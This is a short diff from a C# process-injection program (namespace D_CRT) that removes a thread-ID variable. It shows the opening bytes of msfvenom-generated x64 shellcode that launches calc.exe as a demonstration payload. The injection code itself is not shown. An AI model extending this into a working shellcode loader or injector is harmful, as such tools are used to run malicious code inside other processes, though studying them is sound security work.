@@ -63,8 +63,6 @@ namespace D_CRT
 
         static void Main(string[] args)
         { 
-            IntPtr threadId; // the thread ID of our injected process
-
             // shellcode: msfvenom -p windows/x64/exec CMD="calc.exe" -f csharp
             byte[] buf = new byte[276] {
                 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
